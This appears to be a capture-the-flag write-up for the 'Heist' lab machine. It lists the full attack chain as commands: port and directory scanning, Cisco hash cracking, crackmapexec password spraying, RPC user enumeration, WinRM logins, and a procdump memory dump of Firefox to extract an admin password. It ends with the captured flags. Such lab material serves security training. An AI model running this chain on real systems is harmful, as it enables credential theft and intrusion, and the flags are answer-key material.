# Heist - Easy

```shell
nmap -T4 -p- -A -v 10.10.10.149

feroxbuster -u http://10.10.10.149 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

#crack the hash
hashcat -a 0 -m 500 ciscohash.txt /usr/share/wordlists/rockyou.txt

vim users.txt
#add usernames found

vim passes.txt
#add passwords found

#using cme for enumeration
crackmapexec smb -u users.txt -p passes.txt --shares 10.10.10.149

evil-winrm -i 10.10.10.149 -u hazard -p 'stealth1agent'
#does not work

rpcclient -U 'hazard%stealth1agent' 10.10.10.149
#for user enumeration

#in rpcclient
lookupnames hazard
#gives hazard SID

lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
#user hazard

#we can also use lookupsid.py
lookupsid.py hazard:'stealth1agent'@10.10.10.149

#checking for valid creds again with new users
crackmapexec smb -u users.txt -p passes.txt --shares 10.10.10.149 --continue-on-success

evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'
#we get powershell shell as chase

whoami /priv
#we can do basic enumeration

cd ..
#in chase home directory

gci -recurse . | select fullname
#powershell command to go through files recursively and print filename

cd C:\

#go through webfiles
cd inetpub\wwwroot
#we are not allowed to read files

cd C:\

cd "Program Files"

dir
#firefox is installed

Get-Process
#get running processes
#firefox instances used

#download procdump tool from sysinternals
#upload it to chase directory in evil-winrm
cd C:\Users\Chase\Documents

upload /home/sv/Tools/procdump/procdump64.exe

#using procdump for first time
.\procdump64.exe -accepteula

#use -,a flag to write full dump file
.\procdump64.exe -ma 3736
#where 3736 is pid of firefox instance

#transfer dump file to attacker machine
download firefox.exe_221103_093255.dmp

#search for passwords in dmp file
strings firefox.exe_221103_093255.dmp| grep password | less
#we get password for admin@support.htb

vim users.txt
#add Administrator

vim passes.txt
#add the password found from dump file

crackmapexec smb -u users.txt -p passes.txt --shares 10.10.10.149 --continue-on-success
#we get valid creds for Administrator

evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
#get Admin shell
```

* Open ports & services:

  * 80 - http - Microsoft IIS httpd 10.0
  * 135 - msrpc - RPC
  * 445 - microsoft-ds
  * 5985 - http - Microsoft HTTPAPI httpd 2.0
  * 49669 - msrpc - RPC

* Enumerated directories and pages:

  * /login.php
  * /attachments
  * /css
  * /errorpage.php
  * /images
  * /js

* While we cannot access the directories, we can access the pages inside.

* On accessing /attachments/config.txt (enumerated by feroxbuster), we get a file containing encoded creds.

* The config file, on Googling some of the commands, seems like it is for Cisco IOS config; moreover it contains a hash of type Cisco-IOS (MD5) for 'secret'.

* On cracking the hash with hashcat, we get the string "stealth1agent".

* The config file also contains encrypted passwords for two users - rout3r and admin; type 7 passwords refer to Vignere cipher passwords.

* We can use online tools to decrypt Cisco type 7 passwords; for rout3r, we get the password "$uperP@ssword" and for admin, "Q4)sJu\Y8qz*A3?d".

* We can attempt to login as guest on /login.php and we get access to a issue chat - this includes the same config file as an attachment that we just went through.

* From the issue chat, we also get the username 'hazard'.

* Now, we have 3 usernames and 3 passwords; we can store them in separate files.

* We can use the crackmapexec tool to enumerate users; SMB shares will be enumerated here.

* crackmapexec shows us that one pair of credentials, hazard:stealth1agent, is able to access SMB shares.

* evil-winrm does not work using these creds, so we have to try other routes.

* As we have access to IPC$, we can attempt to use rpcclient for further enumeration; it gives us info regarding username and SID.

* We can also use lookupsids.py, which brute-forces SIDs and prints usernames.

* Now, we have some more usernames to work on; we can use this with the passwords already obtained and try to get a shell.

* Using crackmapexec again, we get another pair of valid creds, chase:Q4)sJu\Y8qz*A3?d

* We can attempt to get a shell using these creds with the help of evil-winrm.

* After getting shell as chase, we can do basic enumeration to check for clues.

* After getting user flag, we can check for any web files; we are not allowed to read files.

* Going through Program Files, we can see Mozilla Firefox; we can do a memory dump to check for creds.

* After noting down the process IDs for the running firefox processes, we can use [ProcDump from SysInternals Suite](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) for memory dumping using -ma flag.

* We can transfer the dump file from victim shell to attacker machine for further inspection.

* Searching for passwords in the memory dump gives us the creds admin@support.htb:4dD!5}x/re8]FBuZ, used for logging into a webpage.

* We can attempt to use this password for Administrator on the machine; adding Administrator to usernames and the password found to passwords file will help while using crackmapexec.

* crackmapexec confirms the found password is valid for Administrator user.

* We can login as Administrator using evil-winrm and get the root flag.

```markdown
1. User flag - 4638b00ba64dabffe2e1b66a658005f1

2. Root flag - 5e95a46c5894277427f78c8e1e44ff18
```
